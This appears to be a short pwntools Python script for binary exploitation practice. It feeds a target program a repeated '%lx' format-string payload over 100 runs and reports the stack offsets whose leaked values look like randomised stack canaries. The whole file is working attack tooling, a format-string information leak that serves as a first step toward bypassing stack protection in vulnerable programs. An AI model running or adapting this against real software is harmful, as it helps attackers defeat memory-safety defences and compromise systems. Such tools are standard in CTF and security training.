from pwn import *
import sys

context.log_level='warn'
context = ELF(sys.argv[1])

n = 1000
tests = 100

word = context.bits // 8
fmt = "%x" if word == 4 else "%lx"
separator = "\n"

format_string = (fmt + separator) * n + ";"

possible_canary = {}
last_values = {}

for t in range(tests):
    p = process([context.path, format_string])

    data_leak = p.recvuntil(b";")[:-2].decode()
    values = data_leak.split("\n")


    for i in range(len(values)):
        if values[i][-2:] == "00":
            # print(f"{hex(i*8)}: {values[i]}")
            if t == 0:
                possible_canary[i] = True
            elif values[i] == last_values[i]:
                possible_canary[i] = False
        else:
            possible_canary[i] = False
        last_values[i] = values[i]

print("Possibili Canaries:")
print("OFFSET\tLAST_VALUE")
for key in possible_canary.keys():
    if possible_canary[key]:
        print(f"{key+1}:\t{last_values[key]}")

p.close()
